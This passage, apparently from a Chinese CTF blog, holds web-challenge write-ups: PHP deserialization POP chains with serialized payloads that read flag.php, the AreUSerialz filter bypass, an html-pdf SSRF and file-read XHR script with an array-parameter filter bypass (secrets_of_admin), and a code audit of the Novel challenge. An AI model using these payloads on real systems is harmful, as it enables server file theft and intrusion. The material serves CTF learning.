class="hljs-string">&quot;karsa&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>&#125;<br><br>$a = <span class="hljs-keyword">new</span> Show(<span class="hljs-string">&#x27;aaa&#x27;</span>);<br>$a-&gt;str = <span class="hljs-keyword">new</span> Test();<br>$a-&gt;str-&gt;p = <span class="hljs-keyword">new</span> Modifier();<br>$b = <span class="hljs-keyword">new</span> Show($a);<br><span class="hljs-keyword">echo</span> urlencode(serialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Show%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>source%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Br%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>str%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>str%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Test%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>p%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Read%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>var%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>flag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>

<p>payload2：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var = <span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>    <br>    &#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>     <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;str = <span class="hljs-keyword">new</span> Test();<br>        <br>    &#125;<br>&#125;  <br>    <br>    <br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">new</span> Modifier();<br>    &#125;<br>&#125;<br>$a = <span class="hljs-keyword">new</span> Show();<br>$b = <span class="hljs-keyword">new</span> Show();<br>$b-&gt;source = $a;<br>$b-&gt;str = <span class="hljs-string">&quot;&quot;</span>;<br>var_dump(urlencode(serialize($b)));<br><br></code></pre></td></tr></table></figure>

<p>得到：</p>
<p><img src="/2021/09/03/2021/buu/19/image-20211022163619114.png" alt="image-20211022163619114"></p>
<p><img src="/2021/09/03/2021/buu/19/image-20210904213507487.png" alt="image-20210904213507487"></p>
<p><img src="/2021/09/03/2021/buu/19/image-20210904214001095.png" alt="image-20210904214001095"></p>
<h4 id="0x01知识点"><a href="#0x01知识点" class="headerlink" title="0x01知识点"></a>0x01知识点</h4><p>通过这题好好再恶补一次我的代码审计</p>
<h5 id="1-this-gt-p"><a href="#1-this-gt-p" class="headerlink" title="1.$this-&gt;p"></a>1.$this-&gt;p</h5><p>摘抄于一篇文章：<a href="https://www.cnblogs.com/ytkah/p/9633690.html">https://www.cnblogs.com/ytkah/p/9633690.html</a></p>
<p>php中$this-&gt;的用法简单介绍</p>
<p>php中我们一般是先声明一个类，然后用这个类去实例化对象</p>
<p>$this的含义是表示实例化后的具体对象</p>
<p>$this-&gt;表示在类本身内部使用本类的属性或者方法</p>
<p>‘ -&gt; ’ 符号是插入式解引用操作符。</p>
<p>换句话说，它是有调用由引用传递参数的子程序的方法</p>
<p>例子：</p>
<p>比如我们声明一个User类，它只含有一个属性 $name</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-keyword">public</span> $_name;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>现在，我们给User类加个方法，就用getName()方法，输出$name的值吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-keyword">public</span> $_name;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getName</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;name;<br>	&#125;<br>&#125;<br><span class="hljs-comment">//如何使用呢？</span><br>$user1 = <span class="hljs-keyword">new</span> User();<br>$user1-&gt;name = <span class="hljs-string">&#x27;张三&#x27;</span>;<br>$user1-&gt;getName();        <span class="hljs-comment">//这里就会输出张三！</span><br>$user2 = <span class="hljs-keyword">new</span> User();<br>$user2-&gt;name = <span class="hljs-string">&#x27;李四&#x27;</span>;  <br>$user2-&gt;getName();       <span class="hljs-comment">//这里会输出李四！</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>我也上在线工具试了下</p>
<p><img src="/2021/09/03/2021/buu/19/image-20210905155102186.png" alt="image-20210905155102186"></p>
<h5 id="2-PHP中的魔术方法"><a href="#2-PHP中的魔术方法" class="headerlink" title="2.PHP中的魔术方法"></a>2.PHP中的魔术方法</h5><p><a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">__sleep() <span class="hljs-regexp">//</span>使用serialize时触发<br>__destruct() <span class="hljs-regexp">//</span>对象被销毁时触发<br>__call() <span class="hljs-regexp">//</span>在对象上下文中调用不可访问的方法时触发<br>__callStatic() <span class="hljs-regexp">//</span>在静态上下文中调用不可访问的方法时触发<br>__get() <span class="hljs-regexp">//</span>用于从不可访问的属性读取数据<br>__set() <span class="hljs-regexp">//</span>用于将数据写入不可访问的属性<br>__isset() <span class="hljs-regexp">//</span>在不可访问的属性上调用isset()或empty()触发<br>__unset() <span class="hljs-regexp">//</span>在不可访问的属性上使用unset()时触发<br>__toString() <span class="hljs-regexp">//</span>把类当作字符串使用时触发<br>__invoke() <span class="hljs-regexp">//</span>当脚本尝试将对象调用为函数时触发<br></code></pre></td></tr></table></figure>

<h5 id="3-进一步理解本题代码"><a href="#3-进一步理解本题代码" class="headerlink" title="3.进一步理解本题代码"></a>3.进一步理解本题代码</h5><p>_invoke()函数：对象本身是不能够当作函数使用的，一旦被当作函数使用，，就会回调执行 _invoke()方法</p>
<p>_construct()函数：构造函数/方法</p>
<p>构造函数（constructor method，也称为构造器）是类中的一种特殊函数，当使用 new 关键字实例化一个对象时，构造函数将会自动调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">参数列表</span>)</span>&#123;<br>  ... ...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>_get()函数： 访问不存在的成员变量时触发</p>
<p>作者这段话今天看懂了点</p>
<p><img src="/2021/09/03/2021/buu/19/image-20210905161234966.png" alt="image-20210905161234966"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 青龙组AreUSerialz</title>
    <url>/2021/07/26/2021/buu/2/</url>
    <content><![CDATA[<p>​    打开后，出现代码页面</p>
<p><img src="/2021/07/26/2021/buu/2/image-20210726194801767.png" alt="image-20210726194801767"></p>
<p>​    处理到vs上</p>
<p><img src="/2021/07/26/2021/buu/2/image-20210726194850909.png" alt="image-20210726194850909"></p>
<p>接着我们逐段分析：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">include</span>(&quot;flag.php&quot;);<br></code></pre></td></tr></table></figure>

<p>​    包含了名为flag.php的文件。</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">protected</span> $op;<br><br><span class="hljs-keyword">protected</span> $filename;<br><br><span class="hljs-keyword">protected</span> $content;<br></code></pre></td></tr></table></figure>

<p>​    受保护方法的三个变量</p>
<p>接下来是借鉴了大佬博客</p>
<p>经过分析，这个题目需要传入一个序列化之后的类对象（因为最后的valid函数会进行一步反序列化），并且要绕过两层防护：</p>
<p>两个防护：<br><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$s</span>) </span>&#123;<br><br>  <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($s); $i++)<br><br>​    <span class="hljs-keyword">if</span>(!(ord($s[$i]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="hljs-number">125</span>))<br><br>​      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里用到了python的ord函数：</p>
<p>[^]: ord () 函数是 chr () 函数（对于8位的ASCII字符串）或 unichr () 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值</p>
<p>绕过方法：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p>
<p><strong>destruct()魔术方法</strong><br>op===”2”，是强比较，（tips：“2”表示为字符串类型2）<a href="https://www.runoob.com/php/php-types-comparisons.html">PHP 类型比较 | 菜鸟教程 (runoob.com)</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br></code></pre></td></tr></table></figure>

<p> <strong>而在process()函数中,</strong></p>
<p>op==”2”是弱比较</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            $res = <span class="hljs-keyword">$this</span>-&gt;read();<br>            <span class="hljs-keyword">$this</span>-&gt;output($res);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>


<p> 绕过方法：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true.</p>
<p><img src="/2021/07/26/2021/buu/2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>绕过之后，就是到了关键一步，要进行本地序列化操作：</p>
<p>我直接照搬了大佬的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span>  $op = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  $filename = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  $content = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br><br>&#125;<br><br>$a = <span class="hljs-keyword">new</span> FileHandler();<br>$b = serialize($a);<br><span class="hljs-keyword">echo</span> $b;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>访问xu.php</p>
<p><img src="/2021/07/26/2021/buu/2/image-20210726200434420.png" alt="image-20210726200434420"></p>
<p>​        构建payload：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><code class="hljs groovy">?str=O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-attr">s:</span><span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;<span class="hljs-attr">i:</span><span class="hljs-number">2</span>;<span class="hljs-attr">s:</span><span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;<span class="hljs-attr">s:</span><span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;<span class="hljs-attr">s:</span><span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;<span class="hljs-attr">s:</span><span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>​        F12得到flag：</p>
<p><img src="/2021/07/26/2021/buu/2/image-20210726200827967.png" alt="image-20210726200827967"></p>
<p>本文借鉴于：[<a href="https://blog.csdn.net/RABCDXB/article/details/114297291">网鼎杯 2020 青龙组]AreUSerialz_RABCDXB的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>CTF·反序列化</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>2021祥云杯 secrets_of_admin&amp;crwaler_z</title>
    <url>/2021/09/07/2021/buu/21/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/rfrder/article/details/119914746">祥云杯2021 Web复现_feng的博客-CSDN博客</a></p>
<p>[祥云杯2021 web wp | Z3ratu1’s blog](<a href="https://blog.z3ratu1.cn/%E7%A5%A5%E4%BA%91%E6%9D%AF2021">https://blog.z3ratu1.cn/祥云杯2021</a> wp.html#more)</p>
<p><a href="https://cbatl.gitee.io/">ly0n - A hard-working boy (gitee.io)</a></p>
<p><a href="https://www.freebuf.com/articles/system/178150.html">Linux下几种反弹Shell方法的总结与理解 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.wlhhlc.top/posts/20107/#cralwer-z">2021祥云杯WEB-WP | dota_st (wlhhlc.top)</a></p>
<h4 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h4><p>打开后页面如下：</p>
<p><img src="/2021/09/07/2021/buu/21/image-20210908114725080.png" alt="image-20210908114725080"></p>
<p>database.js里直接给出用户名和密码：</p>
<p>Username：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">admin</span><br></code></pre></td></tr></table></figure>

<p>Password：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">e<span class="hljs-number">365655e013</span>ce<span class="hljs-number">7</span>fdbdbf<span class="hljs-number">8</span>f<span class="hljs-number">27</span>b<span class="hljs-number">418</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>fe<span class="hljs-number">6</span>dc<span class="hljs-number">9354</span>dc<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">0328</span>fa<span class="hljs-number">02</span>b<span class="hljs-number">0</span>ea<span class="hljs-number">547659645</span><br></code></pre></td></tr></table></figure>

<p>登录后就有了上传界面</p>
<p><img src="/2021/09/07/2021/buu/21/image-20210908114945704.png" alt="image-20210908114945704"></p>
<p>提示我们上传pdf类型的文件，又只能post传参</p>
<p>以下直<code>files</code>表可以知道，flag在<code>superuser</code>那里，但是<code>superuser</code>不能用。通过下面三行代码也可以知道，需要把<code>flag</code>给<code>admin</code>用户接摘抄wp（因为我没源码）</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">let</span> filename = await <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DB</span>.</span></span>get<span class="hljs-constructor">File(<span class="hljs-params">token</span>.<span class="hljs-params">username</span>, <span class="hljs-params">req</span>.<span class="hljs-params">params</span>.<span class="hljs-params">id</span>)</span><br>         <span class="hljs-keyword">if</span> (fs.exists<span class="hljs-constructor">Sync(<span class="hljs-params">path</span>.<span class="hljs-params">join</span>(<span class="hljs-params">__dirname</span> , <span class="hljs-string">&quot;../files/&quot;</span>, <span class="hljs-params">filename</span>)</span>))&#123;<br>             return res.send(await read<span class="hljs-constructor">File(<span class="hljs-params">path</span>.<span class="hljs-params">join</span>(<span class="hljs-params">__dirname</span> , <span class="hljs-string">&quot;../files/&quot;</span>, <span class="hljs-params">filename</span>)</span>));<br><br></code></pre></td></tr></table></figure>

<p>但是/api/files/功能那里需要SSRF。</p>
<p>通过查找html-pdf库发现它存在一个任意文件读取：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">html-pdf <span class="hljs-keyword">before</span> <span class="hljs-built_in">version</span> <span class="hljs-number">3.0</span><span class="hljs-number">.1</span> is vulnerable <span class="hljs-built_in">to</span> Arbitrary File Read. The package fails <span class="hljs-built_in">to</span> sanitize <span class="hljs-keyword">the</span> HTML input, allowing attackers <span class="hljs-built_in">to</span> exfiltrate server <span class="hljs-built_in">files</span> <span class="hljs-keyword">by</span> supplying malicious HTML code. XHR requests <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> HTML code are executed <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> server. Input <span class="hljs-keyword">with</span> <span class="hljs-keyword">an</span> XHR request such <span class="hljs-keyword">as</span> request.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>) will <span class="hljs-built_in">result</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> PDF document <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> contents <span class="hljs-keyword">of</span> /etc/passwd.<br></code></pre></td></tr></table></figure>

<p>因此可以利用制造pdf的功能来实现ssrf，把flag给admin用户。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;script&gt;<br><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=1&quot;</span>, <span class="hljs-literal">true</span>);xhr.send();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>而且filename字段是UNIQUE，需要不能直接flag，用./flag。</p>
<p>但是有个问题就是这个过滤：</p>
<pre><code>if ( content == &#39;&#39; || content.includes(&#39;&lt;&#39;) || content.includes(&#39;&gt;&#39;) || content.includes(&#39;/&#39;) || content.includes(&#39;script&#39;) || content.includes(&#39;on&#39;))&#123;
    // even admin can&#39;t be trusted right ? :)  
    return res.render(&#39;admin&#39;, &#123; error: &#39;Forbidden word 🤬&#39;&#125;);
&#125; else &#123;</code></pre>
<p>当时自己就卡在了这里，不知道怎么绕过。关键就在于node.js的弱类型和php的弱类型有所不同。js中数组和字符串拼接的话，比如[“hello”]+”world”，得到的是helloworld，而php里确实Arrayworld。也是因为深受php的影响，所以没想到这里可以用数组来绕过，记得URL编码</p>
<p>然后我是丢进bp里，只需要content改成content[],传数组</p>
<p><img src="/2021/09/07/2021/buu/21/image-20210908115802410.png" alt="image-20210908115802410"></p>
<p><img src="/2021/09/07/2021/buu/21/image-20210908120122404.png" alt="image-20210908120122404"></p>
<p>出现这个页面就是成功</p>
<p><img src="/2021/09/07/2021/buu/21/image-20210908120634020.png" alt="image-20210908120634020"></p>
<p>打开后就有flag</p>
<p><img src="/2021/09/07/2021/buu/21/image-20210908120715884.png" alt="image-20210908120715884"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 总决赛 Novel&amp;GameExp</title>
    <url>/2021/09/04/2021/buu/20/</url>
    <content><![CDATA[<h4 id="Novel"><a href="#Novel" class="headerlink" title="Novel:"></a>Novel:</h4><p>参考博客：</p>
<p><a href="https://www.cnblogs.com/W4nder/p/14078695.html">网鼎杯2020线下web - W4nder - 博客园 (cnblogs.com)</a></p>
<p><a href="https://mount4in.github.io/2020/12/08/2020%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEwriteup/">2020第二届网鼎杯半决赛Web题目writeup | Mount4in</a></p>
<p>在buu上下载了源文件</p>
<p><img src="/2021/09/04/2021/buu/20/image-20210905094734716.png" alt="image-20210905094734716"></p>
<p>先看看index.php</p>
<p>源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>defined(&#39;DS&#39;) or define(&#39;DS&#39;, DIRECTORY_SEPARATOR);<br>define(&#39;APP_DIR&#39;, realpath(&#39;.&#x2F;&#39;));<br>error_reporting(0);<br>function autoload_class($class)&#123;<br>	foreach(array(&#39;class&#39;) as $dir)&#123;<br>		$file &#x3D; APP_DIR.DS.$dir.DS.$class.&#39;.class.php&#39;;<br>		&#x2F;&#x2F; echo $file;<br>		if(file_exists($file))&#123;<br>			&#x2F;&#x2F; echo $file;<br>			include_once $file;<br>		&#125;<br>	&#125;<br>&#125;<br><br><br>function upload($config)&#123;<br>	$upload_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];<br>	foreach(array(&#39;file&#39;,&#39;method&#39;) as $param)&#123;<br>		$upload_config[&#39;data&#39;][$param]&#x3D;$config[$param];<br>	&#125;<br>	&#x2F;&#x2F; var_dump($upload_config);<br>	return $upload_config;<br>&#125;<br><br>function home($config)&#123;<br>	$home_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];<br>	$home_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];<br>	return $home_config;<br>&#125;<br><br>function back($config)&#123;<br>	$copy_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];<br>	$copy_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];<br>	$copy_config[&#39;data&#39;][&#39;filename&#39;]&#x3D;$config[&#39;post&#39;][&#39;filename&#39;];<br>	$copy_config[&#39;data&#39;][&#39;dest&#39;]&#x3D;$config[&#39;post&#39;][&#39;dest&#39;];<br>	return $copy_config;<br>&#125;<br><br><br>spl_autoload_register(&#39;autoload_class&#39;);<br><br>$request&#x3D;isset($_SERVER[&#39;REQUEST_URI&#39;])?$_SERVER[&#39;REQUEST_URI&#39;]:&#39;&#x2F;&#39;;<br><br>$config[&#39;get&#39;]&#x3D;$_GET;<br>$config[&#39;post&#39;]&#x3D;$_POST;<br>$config[&#39;file&#39;]&#x3D;$_FILES;<br><br>$parameters&#x3D;explode(&#39;&#x2F;&#39;,explode(&#39;?&#39;, $request)[0]);<br>$class&#x3D;(isset($parameters[1]) &amp;&amp; !empty($parameters[1]))?$parameters[1]:&#39;home&#39;;<br>&#x2F;&#x2F; echo $class;<br>$method&#x3D;(isset($parameters[2]) &amp;&amp; !empty($parameters[2]))?$parameters[2]:&#39;index&#39;;<br>&#x2F;&#x2F; echo $method;<br><br>$config[&#39;class&#39;]&#x3D;$class;<br>$config[&#39;method&#39;]&#x3D;$method;<br><br>if(!empty($class))&#123;<br>	if(in_array($class, array(&#39;upload&#39;,&#39;home&#39;,&#39;back&#39;)))&#123;<br>		&#x2F;&#x2F; echo $class;<br>		$class_init_config&#x3D;call_user_func($class, $config);<br>		&#x2F;&#x2F; print_r($class_init_config);<br>		new $class_init_config[&#39;class&#39;]($class_init_config[&#39;data&#39;]);<br>	&#125;else&#123;<br>		header(&#39;Location: &#x2F;&#39;);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>index.php中实现了有一个类自动加载，可以以<code>http://ip/class/method</code>的形式去调用对应类的函数</p>
<p>//类自动加载</p>
<p><a href="https://www.php.net/manual/zh/language.oop5.autoload.php">https://www.php.net/manual/zh/language.oop5.autoload.php</a></p>
<p><img src="/2021/09/04/2021/buu/20/image-20210905095559300.png" alt="image-20210905095559300"></p>
<p><img src="/2021/09/04/2021/buu/20/image-20210905095718327.png" alt="image-20210905095718327"></p>
<p>然后在<code>class</code>文件夹中有三个文件，分别为</p>
<p><code>home.class.php</code>、 <code>upload.class.php</code> 、<code>back.class.php</code>，分别对应主页、上传和备份功能的实现，接下来审计这三个文件</p>
<p>我们采用分而置之来分析</p>
<p>1.upload.class.php，上传功能</p>
<p><img src="/2021/09/04/2021/buu/20/image-20210905100016508.png" alt="image-20210905100016508"></p>
<p>文件被上传到<code>profile</code>目录下，文件名可控，但是其后缀进行了限制，只能用txt，然后就是大小限制。</p>
<p>PHP in_array() 函数</p>
<p>定义和用法</p>
<p>in_array() 函数搜索数组中是否存在指定的值。</p>
<p><strong>注释：</strong>如果 <em>search</em> 参数是字符串且 <em>type</em> 参数被设置为 TRUE，则搜索区分大小写。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">in</span><span class="hljs-constructor">_array(<span class="hljs-params">search</span>,<span class="hljs-params">array</span>,<span class="hljs-params">type</span>)</span><br></code></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>search</em></td>
<td align="left">必需。规定要在数组搜索的值。</td>
</tr>
<tr>
<td align="left"><em>array</em></td>
<td align="left">必需。规定要搜索的数组。</td>
</tr>
<tr>
<td align="left"><em>type</em></td>
<td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td>
</tr>
</tbody></table>
<p>例子：</p>
